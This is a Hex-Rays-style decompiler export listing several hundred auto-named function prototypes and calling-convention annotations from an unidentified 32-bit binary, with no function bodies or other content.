int __cdecl sub_4474E0(int a1, int a2, int a3);
int __cdecl sub_447500(int a1, int a2, int a3);
int __cdecl sub_447520(int a1, int a2, int a3);
BOOL __cdecl sub_447540(int a1, _DWORD *a2, int a3);
// int __usercall sub_4476B0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
// int __usercall sub_447910@<eax>(_DWORD *a1@<esi>);
int __cdecl sub_4479D0(_DWORD *a1);
int __cdecl sub_447D80(int a1, int a2, int a3, _DWORD *a4);
int sub_447DD0();
void __cdecl sub_447DE0(void *Block);
int sub_447E00();
int __cdecl sub_447E10(int a1);
int __cdecl sub_447E50(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_447E70(int a1, int a2);
int __cdecl sub_447EA0(int a1, void **a2, size_t Size);
int __cdecl sub_447EF0(int a1, void **a2);
// int __usercall sub_447F60@<eax>(_DWORD *a1@<ebx>, FILE *a2@<edi>, _DWORD *a3);
int __cdecl sub_448030(int *a1, void **Block);
// volatile LONG ***__usercall sub_448130@<eax>(int *a1@<ecx>, __m64 a2@<mm0>, int a3);
// int __usercall sub_4481E0@<eax>(__m64 a1@<mm0>, int a2, int a3);
unsigned int __cdecl sub_4482E0(int a1, int a2);
// int __usercall sub_448330@<eax>(__m64 a1@<mm0>, int a2, int a3);
BOOL __cdecl sub_448420(int *a1, const void **a2);
int __cdecl sub_448570(int a1);
int __cdecl sub_448580(int a1);
int __cdecl sub_4485A0(int a1);
BOOL __cdecl sub_448600(int a1);
volatile LONG **__cdecl sub_448630(int a1, int a2);
BOOL __cdecl sub_448690(int a1, int a2);
void __cdecl sub_4486C0(volatile LONG **Block);
// int __usercall sub_4486D0@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<edi>, int Size);
// int __usercall sub_4488C0@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, int a4);
int __cdecl sub_448910(FILE *Stream, void **a2);
int __cdecl sub_448920(int a1, int a2, int a3);
int __cdecl sub_448940(int a1, int a2, int a3);
int __cdecl sub_448960(int a1, int a2, int a3);
// int __usercall sub_448980@<eax>(__m64 a1@<mm0>, int a2, void **a3, int a4);
int __cdecl sub_4489E0(int a1, void **a2);
// int __usercall sub_4489F0@<eax>(int a1@<ebx>, __m64 a2@<mm0>, int a3, _DWORD *a4);
// BOOL __usercall sub_448B20@<eax>(int a1@<esi>, int a2);
int __cdecl sub_448BF0(int a1);
// int __usercall sub_448DC0@<eax>(_DWORD *a1@<edi>, __m64 a2@<mm0>);
int __cdecl sub_448E80(_DWORD *a1);
// int __usercall sub_449240@<eax>(__m64 a1@<mm0>, _DWORD *a2, int *a3, int a4, _DWORD *a5);
int __cdecl sub_4495A0(int *a1, int a2);
// int __usercall sub_4496B0@<eax>(__m64 a1@<mm0>, int a2, int a3);
int __cdecl sub_449840(int *a1, int a2);
int __cdecl sub_449970(int a1);
int __cdecl sub_449980(int a1);
int __cdecl sub_449990(int a1);
BOOL __cdecl sub_4499A0(int a1);
int __cdecl sub_4499D0(int a1, int a2);
BOOL __cdecl sub_449A80(int a1, int a2);
BOOL __cdecl sub_449AF0(int a1, int a2);
void __cdecl sub_449B20(volatile LONG **Block);
// BOOL __usercall sub_449B30@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, void *Block);
int __cdecl sub_449C50(int a1, void **a2, int a3);
signed int __cdecl sub_449CA0(int a1, void **a2);
BOOL __cdecl sub_449CB0(int a1, int a2, int a3);
BOOL __cdecl sub_449CD0(int a1, int a2, int a3);
BOOL __cdecl sub_449CF0(int a1, int a2, int a3);
int __cdecl sub_449D10(int a1, void **a2, int a3);
signed int __cdecl sub_449D60(int a1, void **a2);
BOOL __cdecl sub_449D70(int a1, int a2, int *a3, int a4);
int __cdecl sub_449E60(int a1, int *a2, int a3, _DWORD *a4);
int __cdecl sub_449FF0(int *a1, int a2);
int __cdecl sub_44A060(int a1, int a2);
BOOL __cdecl sub_44A0E0(int a1, int a2);
int __cdecl sub_44A130(int a1, void **a2, int a3);
signed int __cdecl sub_44A180(int a1, void **a2);
int __cdecl sub_44A190(int *a1, int a2);
int __cdecl sub_44A210(int a1, int a2);
int __cdecl sub_44A290(int a1);
int __cdecl sub_44A2A0(int a1);
int __cdecl sub_44A2C0(int a1);
void __cdecl sub_44A2D0(volatile LONG **Block);
// BOOL __usercall sub_44A2E0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4);
BOOL __cdecl sub_44A460(int a1, int a2, int a3);
BOOL __cdecl sub_44A480(int a1, int a2, int a3);
// int __usercall sub_44A4A0@<eax>(int *a1@<ebx>, int a2);
// BOOL __usercall sub_44A510@<eax>(int a1@<ebx>, int **a2@<edi>, int a3@<esi>, int *a4);
BOOL __cdecl sub_44A720(int a1, int *a2, int *a3, int a4);
// int __usercall sub_44A7D0@<eax>(int a1@<esi>, int *a2);
// BOOL __usercall sub_44A800@<eax>(int a1@<ebx>, int *a2@<edi>);
const char *__cdecl sub_44A8C0(int *a1);
// const char *__usercall sub_44A910@<eax>(int *a1@<esi>, int *a2);
void *__thiscall sub_44A9C0(void *this);
int __cdecl sub_44AB40(int a1, int a2, int a3);
// int __usercall sub_44AD80@<eax>(_DWORD *a1@<esi>);
int __cdecl sub_44AE10(int a1, int a2, int a3, int *a4, int a5, int a6);
// int __usercall sub_44AE70@<eax>(_DWORD *a1@<edi>);
int __cdecl sub_44AF30(FILE *Stream, int a2, int a3, int a4, int a5); // idb
// int __usercall sub_44B000@<eax>(int *a1@<ebx>, int a2);
int __thiscall sub_44B070(_DWORD *this);
int __thiscall sub_44B2A0(_DWORD *this);
int __cdecl sub_44B4C0(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_44B5E0(int a1, int a2);
int __cdecl sub_44B660(int a1);
int __cdecl sub_44B6B0(int a1, int a2);
int sub_44B750(); // weak
void __cdecl sub_44B780(void *Block);
void __cdecl sub_44B7A0(int a1);
BOOL sub_44B830();
int __cdecl sub_44B870(int a1, int a2);
int __cdecl sub_44B920(int a1, int a2, int a3);
int __cdecl sub_44BA40(int a1, int a2);
int __cdecl sub_44BA60(int a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_44BAF0(_DWORD *a1, int a2, int a3);
int sub_44BB80(); // weak
int __cdecl sub_44BBE0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_44BC00(int a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5);
void __cdecl sub_44BCA0(void *Block);
void sub_44BCC0();
int __cdecl sub_44BCE0(int a1, const char *a2, unsigned int a3, int a4, int a5, int a6);
BOOL __cdecl sub_44BEC0(int *a1, int *a2);
int __cdecl sub_44C110(int a1, const char *Src);
_DWORD *__cdecl sub_44C190(_DWORD *a1, __time64_t Time, int a3, int a4);
BOOL __cdecl sub_44C2C0(int a1, int *a2);
BOOL __cdecl sub_44C490(int *a1, int *a2);
_DWORD *__cdecl sub_44C6A0(_DWORD *Block, __time64_t Time, int a3, int a4);
struct tm *__cdecl sub_44C950(__time64_t *Time, struct tm *a2);
// int __usercall sub_44C980@<eax>(int a1@<ecx>, int a2@<edi>, int a3);
_DWORD *__cdecl sub_44CA10(_DWORD *a1, _DWORD *a2, _DWORD *a3);
int __fastcall sub_44CAF0(int a1, _DWORD *a2, int a3, int *a4, int *a5);
int __cdecl sub_44CB90(int *a1, int a2, int a3);
int __cdecl sub_44CC70(int a1);
int __cdecl sub_44CCF0(int a1);
int __cdecl sub_44CD20(int a1);
int __cdecl sub_44CDB0(int *a1, int a2, BOOL *a3, int *a4);
int __cdecl sub_44CEA0(unsigned int **a1);
int __cdecl sub_44CEB0(int a1);
int __cdecl sub_44CEC0(int a1);
int __cdecl sub_44CED0(int a1);
_DWORD *__cdecl sub_44CEE0(int a1, _DWORD *a2, _DWORD *a3);
int __cdecl sub_44CF00(int a1);
int __cdecl sub_44CF10(const char *Src, const char *a2, int **a3);
int __cdecl sub_44CFF0(void *Src, void *, int); // idb
void __cdecl sub_44D000(void **Block);
int __cdecl sub_44D050(const char *a1, void *a2, int **a3);
_BYTE *__cdecl sub_44D080(int a1, int a2);
_BYTE *__cdecl sub_44D0E0(int a1, int a2);
_DWORD *__cdecl sub_44D140(int a1, char *a2);
int __cdecl sub_44D280(const char *Src, int a2, int **a3);
int __cdecl sub_44D2D0(int a1, _DWORD *a2);
int __cdecl sub_44D5C0(int a1, _DWORD *a2);
const char *__fastcall sub_44D610(const char *a1);
int __cdecl sub_44D6A0(char *Str1, char *Str2); // idb
// int __usercall sub_44D6F0@<eax>(_BYTE *a1@<esi>, char *Buffer);
int __fastcall sub_44D780(int a1, char *a2, _BYTE *a3);
int __cdecl sub_44D7F0(int *a1, int *a2, int a3);
void *__cdecl sub_44D8A0(const char *Src);
int __cdecl sub_44DA70(char *Buffer, int a2, _DWORD *a3);
int __cdecl sub_44DB00(char *Str); // idb
int __cdecl sub_44DC80(_BYTE *a1, char *Str);
_DWORD *__cdecl sub_44DCC0(char *Str);
char *__cdecl sub_44DD70(char *Str);
int __cdecl sub_44DE80(int a1);
void __cdecl sub_44DEC0(int a1, int a2);
int __cdecl sub_44DF30(int a1, int a2, int a3);
int __cdecl sub_44E1B0(int a1, int a2);
// int __usercall sub_44E3A0@<eax>(_DWORD *a1@<ecx>, int *a2@<ebx>);
int __cdecl sub_44E490(int a1, int *a2, int a3);
// BOOL __usercall sub_44E5D0@<eax>(char *a1@<ebx>, int a2@<edi>, int a3);
int __cdecl sub_44E670(int a1, int a2, int a3);
_DWORD *__cdecl sub_44E720(int a1, int *a2, int a3);
_DWORD *__cdecl sub_44E780(_DWORD *a1, int a2, int a3, int a4, char *Src, int a6);
_DWORD *__cdecl sub_44E970(_DWORD *a1, int a2, int a3, int a4, int a5);
_DWORD *__cdecl sub_44EAA0(int a1, int a2, int a3);
int *__cdecl sub_44EAC0(int a1, _DWORD *a2, int a3);
int *__cdecl sub_44EBE0(int a1, int a2, int *a3);
int *__cdecl sub_44ED40(int a1, int a2, int *a3);
int __cdecl sub_44EDF0(int *a1);
int __cdecl sub_44EE70(int **a1, int a2);
int __cdecl sub_44EEB0(int *a1, int a2);
int __cdecl sub_44EF60(int *a1, void *a2, int a3, int a4);
BOOL __cdecl sub_44F090(void ***a1, int a2);
int __cdecl sub_44F0E0(int *a1, int a2, char *Src, signed int Size);
int __cdecl sub_44F1A0(int *a1, unsigned int a2, int a3);
void ***__cdecl sub_44F1C0(void ****a1, int a2, int a3, char *Src, signed int Size);
void ***__cdecl sub_44F230(void ****a1, char *a2, int a3, char *Src, signed int Size);
void ***__cdecl sub_44F2A0(int *a1, char *a2, int a3, char *Src, signed int Size, int a6, int a7);
int __cdecl sub_44F2F0(int a1);
// _DWORD *__usercall sub_44F340@<eax>(int *a1@<esi>, int a2);
// int __usercall sub_44F3E0@<eax>(int a1@<edi>);
int __fastcall sub_44F430(int a1, int a2);
int __cdecl sub_44F490(int a1, int a2, int a3);
int __cdecl sub_44F4E0(int a1, int a2, int a3);
int __cdecl sub_44F530(int a1, int a2, int a3);
int __cdecl sub_44F590(int a1, int a2, int a3);
int __cdecl sub_44F5F0(int a1, int a2, int a3);
int __cdecl sub_44F650(int a1, int a2, int a3);
int __cdecl sub_44F690(int a1, int a2, int a3);
int __cdecl sub_44F6B0(int a1, _DWORD *a2, int a3);
int sub_44F720();
int __cdecl sub_44F730(int a1, int a2);
void __thiscall sub_44F7F0(int this);
int __cdecl sub_44FC10(int a1, int a2, int a3);
// BOOL __usercall sub_44FCD0@<eax>(volatile LONG *a1@<ebx>, int a2@<edi>, int a3@<esi>, _DWORD *a4, int *a5, int a6);
BOOL __cdecl sub_44FE10(int a1, _DWORD *a2, int *a3, volatile LONG *a4, int a5);
BOOL __cdecl sub_44FE40(int a1, _DWORD *a2, int *a3, volatile LONG *a4, int a5);
int __cdecl sub_44FE70(int a1, int a2, unsigned int *a3);
int __cdecl sub_450060(int a1, int a2, int a3);
void *sub_4501A0();
int __cdecl sub_4501B0(int a1, int *a2, int a3, int a4, _DWORD *a5);
void *sub_450220();
void *sub_450230();
void *sub_450240();
void *sub_450250();
void *sub_450260();
void __cdecl sub_450270(int a1);
void __cdecl sub_450290(int a1);
// int __usercall sub_4502B0@<eax>(int a1@<ebx>, _DWORD *a2, int a3, const char *a4);
BOOL __cdecl sub_450440(int a1, _DWORD **a2, int a3, int a4);
int __cdecl sub_450490(int **a1, _DWORD **a2);
BOOL __cdecl sub_4505A0(int a1, int a2);
int __cdecl sub_450620(int a1, int a2, int a3, int a4);
// int __usercall sub_450740@<eax>(_DWORD *a1@<ebx>, _DWORD *a2@<edi>, int *a3@<esi>);
int __cdecl sub_450790(_DWORD *Block);
int __cdecl sub_4509B0(_DWORD *a1);
_DWORD **__cdecl sub_450D30(int a1, int a2, int *a3);
void *sub_4510B0();
void *sub_4510C0();
void *sub_4510D0();
void *sub_4510E0();
void *sub_4510F0();
void __cdecl sub_451100(int a1);
void __cdecl sub_451120(int a1);
int __cdecl sub_451140(int a1);
// int __cdecl _RTC_NumErrors_1();
// int __usercall sub_451160@<eax>(int a1@<ecx>, unsigned __int8 a2@<bl>, char *a3@<edi>, int a4);
int __fastcall sub_4511E0(int a1, unsigned __int8 a2, int a3, int *a4);
// int __usercall sub_451380@<eax>(int a1@<edi>, int a2, int *a3, int a4);
int __cdecl sub_451480(int a1, int *a2, int a3, int a4);
int __fastcall sub_451700(_DWORD *a1, int *a2, int a3);
int __cdecl sub_451920(int **a1, _DWORD **a2);
int __cdecl sub_451940(int **a1, _DWORD **a2);
// int __usercall sub_451960@<eax>(int a1@<edi>, unsigned __int8 *a2, unsigned __int8 *a3);
int __cdecl sub_451B50(int *a1, void *Src);
int __fastcall sub_451C10(int Size, char *Src, int *a3, unsigned __int8 *Srca);
int *__cdecl sub_451DD0(int *a1, int Src);
int __cdecl sub_451F40(int *a1, int Src);
// _DWORD *__usercall sub_451FC0@<eax>(int a1@<ebx>, int *a2);
int __cdecl sub_452040(int *a1, int a2, int a3, void *Src);
int __cdecl sub_4520C0(int *a1, int a2, int a3, char *Src, unsigned __int8 *a5);
// int __usercall sub_452150@<eax>(char *a1@<ecx>, int a2@<esi>, char *a3, int a4);
int __cdecl sub_4521D0(unsigned int ***a1, unsigned int ***a2);
int __cdecl sub_452270(int *a1);
BOOL __cdecl sub_452760(int *a1, int a2);
int __cdecl sub_452B30(int *a1);
void *__cdecl sub_452BE0(int a1, int a2, int a3);
void *sub_4531D0();
void *sub_4531E0();
void __cdecl sub_4531F0(int a1);
int **__cdecl sub_453210(int a1, int a2, int *a3);
// int __usercall sub_4533A0@<eax>(int a1@<ebx>, int *a2);
int __fastcall sub_453470(int a1, int a2, int *a3, const char *a4);
int __cdecl sub_453530(int a1, int **a2, int a3, int a4);
void __cdecl sub_453570(void **Block);
void __cdecl sub_4535B0(int a1);
BOOL __cdecl sub_4535D0(int a1);
int __cdecl sub_4535E0(int a1, _DWORD *a2);
int __cdecl sub_453620(int a1, _DWORD *a2);
int __cdecl sub_453660(int a1);
int __cdecl sub_453680(int a1);
void *sub_4536A0();
int __cdecl sub_4536B0(int a1);
int __cdecl sub_4536E0(int a1);
int __cdecl sub_453720(_DWORD *a1, int a2, int a3);
int __cdecl sub_4537B0(_DWORD *a1, int a2, int a3);
int __cdecl sub_453860(_DWORD *a1, int a2, int a3, int *a4);
int __cdecl sub_453AC0(int *a1);
int __cdecl sub_453B20(int *a1, int a2, unsigned int *a3, int a4, int a5);
int __cdecl sub_453C00(int *a1);
int __cdecl sub_453C60(_DWORD *a1);
int __cdecl sub_453CD0(int *a1);
int __cdecl sub_453D40(int *a1, int a2, unsigned int *a3, int a4, int a5);
int __cdecl sub_453E20(int a1, _DWORD *a2);
int __cdecl sub_453F90(int *a1, int a2, unsigned int *a3);
void *sub_454070();
int __cdecl sub_454080(_DWORD *a1);
BOOL __cdecl sub_4540A0(int a1);
int __cdecl sub_4540B0(int a1, int a2, int a3);
int __cdecl sub_4540C0(int a1, int a2);
unsigned int __cdecl sub_454100(int a1, const char *a2);
void *sub_454120();
int __cdecl sub_454130(int a1);
int __cdecl sub_4541B0(int a1);
int __cdecl sub_454210(_DWORD *a1, char *a2, int a3);
int __cdecl sub_454490(_DWORD *a1, char *a2, int a3);
int __cdecl sub_454620(_DWORD *a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_4548D0(int a1, int a2, int a3);
int __cdecl sub_4548F0(int);
int __cdecl sub_454900(int *a1, int a2, int a3);
void **__cdecl sub_454960(void ***a1, void *a2);
int __cdecl sub_4549F0(int a1, int a2, char *Src, signed int Size);
int __cdecl sub_454B50(int a1, int a2);
void ***__cdecl sub_454B70(void ****a1, int a2, int a3, char *Src, signed int Size);
void ***__cdecl sub_454C20(void ****a1, int a2, int a3, char *Src, signed int Size);
void ***__cdecl sub_454C90(void ***a1, int a2, int a3, char *Src, signed int Size);
int __cdecl sub_454CE0(int a1, _DWORD *Block);
int __cdecl sub_454D30(int a1, const char *Src, signed int Size);
int __cdecl sub_454D80(_BYTE **a1, int a2, int *a3, int a4);
_DWORD *__cdecl sub_454EF0(_DWORD *Block, int a2, int a3, unsigned int *a4);
_DWORD *__cdecl sub_454F90(_DWORD *Block, int a2);
const char *__cdecl sub_454FB0(unsigned int a1);
// BOOL __usercall sub_454FE0@<eax>(char a1@<bl>, int a2@<edi>, int a3@<esi>, char a4, int a5);
int __cdecl sub_455100(int a1, int *a2, int a3, int a4, int a5, int a6, int a7);
int __cdecl sub_455990(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_4559C0(int a1);
int __cdecl sub_4559D0(int a1, int a2, int a3);
int __cdecl sub_4559E0(char *Src, int a2, int a3);
char **sub_455A50();
int __cdecl sub_455A60(int a1);
// int __usercall sub_455C00@<eax>(__m64 a1@<mm0>, char *a2, int *a3, int a4);
// int __usercall sub_455D50@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, _DWORD *a5, int a6, int *a7, void *a8);
int __cdecl sub_455D80(int a1);
int __cdecl sub_455D90(int a1);
int sub_455DB0();
int __cdecl sub_455DC0(_DWORD *a1);
int __cdecl sub_455DF0(_DWORD *a1);
_DWORD *sub_455E20();
void *__cdecl sub_455E30(int *a1, const char *a2, unsigned int a3, char *a4, int a5, _DWORD *a6, _DWORD *a7, int a8);
int __cdecl sub_455FD0(int *a1, int a2, const char *a3, int a4, char **Block, int a6);
// int __usercall sub_456090@<eax>(__m64 a1@<mm0>, unsigned int *a2, int *a3, _DWORD *a4, int *a5, _DWORD *a6, int **a7, int *a8, _DWORD *a9);
int __cdecl sub_456690(int a1, int a2, int a3, void *a4, signed int *a5, int a6, int a7, int a8);
// int __usercall sub_4566F0@<eax>(__m64 a1@<mm0>, int a2, int *a3, unsigned int **a4, _DWORD **a5, void *a6, size_t Size);
// int __usercall sub_456AD0@<eax>(__m64 a1@<mm0>, int a2, int *a3, unsigned int **a4, _DWORD **a5);
// _DWORD **__usercall sub_456B00@<eax>(__m64 a1@<mm0>, _BYTE *a2, int Size, unsigned int **a4, _DWORD *a5, int a6);
int __cdecl sub_456E30(int a1, int a2, int a3, _BYTE *a4, int a5, int a6);
int __cdecl sub_456F30(_BYTE *a1, int a2, int *a3, FILE *Stream);
int __cdecl sub_457340(int a1, int a2, int a3, int a4);
int __cdecl sub_457380(char **a1, unsigned int *a2, int a3, int a4);
int sub_457610();
int __cdecl sub_457620(_DWORD *a1);
int __cdecl sub_457650(_DWORD *a1);
_DWORD *sub_457680();
int __cdecl sub_457690(int a1);
// _DWORD *__usercall sub_4576A0@<eax>(int a1@<edi>);
int __cdecl sub_457730(int a1);
void __cdecl sub_457760(volatile LONG *Block);
int __cdecl sub_4577E0(int *a1, _DWORD *a2, _DWORD *a3, unsigned int a4, int a5, int a6, int a7);
int __cdecl sub_458210(int *a1, int *a2);
BOOL __cdecl sub_4585F0(int a1);
// int __usercall sub_458610@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, _DWORD *a4, int a5, int *a6);
int __cdecl sub_458850(int a1, _DWORD *a2, int a3, _BYTE *a4, unsigned int a5, int *a6);
// int __usercall sub_458B70@<eax>(__m64 a1@<mm0>, int **a2, int **a3, _BYTE *a4, int a5, int *a6);
// int __usercall sub_458DF0@<eax>(__m64 a1@<mm0>, int **a2, _DWORD *a3, int *a4, int a5, int a6);
int __cdecl sub_459150(int a1, _DWORD *a2, int a3, _BYTE *a4, unsigned int a5, int *a6);
// int __usercall sub_459440@<eax>(__m64 a1@<mm0>, int **a2, int **a3, _BYTE *a4, int a5, int *a6);
int *__fastcall sub_459690(_DWORD *a1, int a2, int *a3);
// BOOL __usercall sub_459720@<eax>(_DWORD *a1@<edx>, _DWORD *a2);
// BOOL __usercall sub_459770@<eax>(int a1@<edi>);
unsigned int __cdecl sub_4597D0(unsigned int *a1);
int __cdecl sub_459AD0(int a1, unsigned int *a2, int a3, int a4, unsigned int a5, int *a6);
// BOOL __usercall sub_45A170@<eax>(int *a1@<esi>);
void **__cdecl sub_45A1F0(_DWORD *a1, int a2, int a3, int a4);
int __cdecl sub_45A2A0(int a1, _DWORD *a2, _DWORD *a3, unsigned int a4, void *a5, void *a6, int *a7);
int __cdecl sub_45A9B0(int a1, _DWORD *a2, int a3, int a4);
// _DWORD *__usercall sub_45AB50@<eax>(int a1@<edi>);
void __cdecl sub_45ABE0(volatile LONG *Block);
BOOL __cdecl sub_45AC40(int a1);
int __cdecl sub_45AC80(int *a1, int *a2);
void *sub_45AFA0();
int __cdecl sub_45AFB0(int a1);
void __cdecl sub_45AFD0(void ***Block);
void __cdecl sub_45B000(_DWORD **Block);
int __cdecl sub_45B030(int a1, int a2);
// int __usercall sub_45B0D0@<eax>(__m64 a1@<mm0>, int a2, int *a3, _DWORD *a4, _DWORD *a5, int *a6);
// int __usercall sub_45B200@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, int a5, int *a6);
// int __usercall sub_45B250@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, int *a5);
// int __usercall sub_45B2A0@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, int *a5);
int __cdecl sub_45B2F0(int a1, unsigned int *a2, _DWORD *a3, int *a4);
BOOL __cdecl sub_45B340(int a1, _DWORD *a2);
void *sub_45B380();
int __cdecl sub_45B390(void ***a1);
int __cdecl sub_45B3F0(int a1);
int __cdecl sub_45B430(int a1, int a2);
int __cdecl sub_45B500(int *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_45B5F0(_DWORD **a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_45B650(int a1);
int __cdecl sub_45B670(int a1, int *a2);
int __cdecl sub_45B720(void ***a1);
void __cdecl sub_45B780(int a1);
int __cdecl sub_45B7B0(int a1, int a2);
int __cdecl sub_45B810(int a1, int *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_45B8B0(int a1, int a2, _DWORD *a3, _DWORD *a4);
BOOL __cdecl sub_45B980(_DWORD **a1, _DWORD *a2, int a3, int a4, int *a5);
BOOL __cdecl sub_45BD30(_DWORD **a1, _DWORD *a2, int a3, int *a4);
int __cdecl sub_45BD50(int a1, int a2, int a3);
int __cdecl sub_45BDB0(_DWORD **a1, int a2, int *a3);
int __cdecl sub_45BF10(int a1, int a2, int a3, int *a4);
int __cdecl sub_45C0A0(int a1, int a2, int *a3);
int __cdecl sub_45C1A0(int a1, unsigned int a2, int a3, int a4);
// int __usercall sub_45C1F0@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
int __cdecl sub_45C220(int a1, _DWORD *a2, _DWORD *a3, int *a4);
// BOOL __usercall sub_45C240@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6);
void *sub_45C270();
int sub_45C280();
int sub_45C2C0();
int sub_45C300();
int sub_45C340();
int sub_45C380();
int sub_45C3C0();
int sub_45C400();
int sub_45C440();
int sub_45C480();
int sub_45C4C0();
int sub_45C500();
int sub_45C540();
int sub_45C580();
int sub_45C5C0();
int sub_45C600();
int sub_45C640();
int sub_45C680();
int sub_45C6C0();
int sub_45C700();
int sub_45C740();
int sub_45C780();
int sub_45C7C0();
int sub_45C800();
int sub_45C840();
int sub_45C880();
int sub_45C8C0();
int sub_45C900();
int sub_45C940();
int __cdecl sub_45C980(int a1, int a2, int a3);
int __cdecl sub_45CA30(int a1, __m128i *a2, const __m128i *a3, int a4);
void *sub_45CB50();
int __cdecl sub_45CB60(int a1, int a2, void *Src);
int __cdecl sub_45CC50(int a1, __m128i *a2, __m128i *Src, int Size);
int __cdecl sub_45CF50(int a1);
int __cdecl sub_45CF80(int a1, int a2, size_t Size, __m128i *Src);
void *sub_45D330();
int __cdecl sub_45D340(int a1, unsigned int *a2, int a3, int a4);
int __cdecl sub_45D410(int C, char *a2, char *a3, int a4);
int __cdecl sub_45D4D0(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_45D540(int C, _BYTE *a2, _BYTE *a3, int a4);
int __cdecl sub_45D5B0(int C, _BYTE *a2, _BYTE *a3, int a4);
int __cdecl sub_45D630(int C, int a2, _BYTE *a3, int a4);
int __cdecl sub_45D6B0(int C, int a2, int a3, unsigned int a4);
int __cdecl sub_45D810(int C, _BYTE *a2, _BYTE *a3, int a4);
void *sub_45D8C0();
void *sub_45D8D0();
void *sub_45D8E0();
void *sub_45D8F0();
void *sub_45D900();
void *sub_45D910();
void *sub_45D920();
void *sub_45D930();
void *sub_45D940();
void *sub_45D950();
void *sub_45D960();
void *sub_45D970();
void *sub_45D980();
void *sub_45D990();
void *sub_45D9A0();
void *sub_45D9B0();
void *sub_45D9C0();
void *sub_45D9D0();
void *sub_45D9E0();
void *sub_45D9F0();
void *sub_45DA00();
int __cdecl sub_45DA10(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4);
int __cdecl sub_45DAC0(int C, _BYTE *a2, char *a3, unsigned int a4);
int __cdecl sub_45DB50(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_45DBC0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
const char *sub_45DCA0();
void *sub_45DCB0();
void *sub_45DCC0();
void *sub_45DCD0();
int __cdecl sub_45DCE0(int a1, int a2);
int __cdecl sub_45DD10(int C, int a2, int *a3, unsigned int a4);
int __cdecl sub_45DDC0(int C, _BYTE *a2, char *a3, unsigned int a4);
int __cdecl sub_45DE50(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_45DEC0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
void *sub_45DFA0();
void *sub_45DFB0();
void *sub_45DFC0();
void *sub_45DFD0();
int __cdecl sub_45DFE0(int a1, unsigned __int8 *a2);
int __cdecl sub_45E010(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4);
int __cdecl sub_45E0C0(int C, _BYTE *a2, char *a3, unsigned int a4);
int __cdecl sub_45E150(int a1, int a2, unsigned __int16 *a3, unsigned int a4);
int __cdecl sub_45E1D0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
void *sub_45E2B0();
void *sub_45E2C0();
void *sub_45E2D0();
void *sub_45E2E0();
void *sub_45E2F0();
void *sub_45E300();
int __cdecl sub_45E310(int a1, int a2);
int __thiscall sub_45E350(void *this);
int __cdecl sub_45E3A0(int a1);
int __cdecl sub_45E3E0(int **a1, int *a2);
BOOL __cdecl sub_45E4D0(void *a1, int a2);
int __cdecl sub_45E510(int a1, int a2, int a3, _DWORD *a4);
int __cdecl sub_45E590(int C, char *a2, char *a3, unsigned int a4);
int __cdecl sub_45E640(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
int __cdecl sub_45E6D0(int a1, int a2, unsigned __int8 *a3, unsigned int a4);
int __cdecl sub_45E740(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
void *sub_45E820();
void *sub_45E830();
void *sub_45E840();
void *sub_45E850();
int __cdecl sub_45E860(int a1, unsigned __int8 *a2);
int __cdecl sub_45E880(int a1, int a2, int a3, unsigned int a4);
int __cdecl sub_45E8E0(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4);
int __cdecl sub_45E990(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
int __cdecl sub_45EA70(int C, _BYTE *a2, char *a3, unsigned int a4);
void *sub_45EB00();
void *sub_45EB10();
void *sub_45EB20();
void *sub_45EB30();
int __cdecl sub_45EB40(int a1, unsigned __int8 *a2, int a3, int a4);
int __cdecl sub_45EC00(int a1, int a2);
int __cdecl sub_45EC70(int a1, __m64 *a2, __m64 *a3, size_t Size);
int __cdecl sub_45EE30(int a1, int a2, int Size, unsigned __int8 *Src);
void *sub_45EFC0();
void *sub_45EFD0();
void *sub_45EFE0();
int __cdecl sub_45EFF0(int a1, int a2);
int __cdecl sub_45F020(int a1, int a2, __m64 *a3, int a4);
int __cdecl sub_45F050(int a1, int a2, unsigned __int16 *a3, unsigned int a4);
int __cdecl sub_45F0E0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4);
int __cdecl sub_45F1F0(int C, int a2, int *a3, unsigned int a4);
int __cdecl sub_45F300(int C, _BYTE *a2, char *a3, unsigned int a4);
int __cdecl sub_45F420(int C, int a2, int a3, unsigned int a4);
int __cdecl sub_45F520(int C, int a2, int a3, unsigned int a4);
void *sub_45F600();
void *sub_45F610();
void *sub_45F620();
void *sub_45F630();
void *sub_45F640();
void *sub_45F650();
void *sub_45F660();
void *sub_45F670();
int __cdecl sub_45F680(int a1, unsigned __int16 *a2);
int __cdecl sub_45F6D0(int a1, unsigned __int16 *a2);
int __cdecl sub_45F720(int a1, int a2, int a3, unsigned __int8 *a4);
void *sub_45F790();
void *sub_45F7A0();
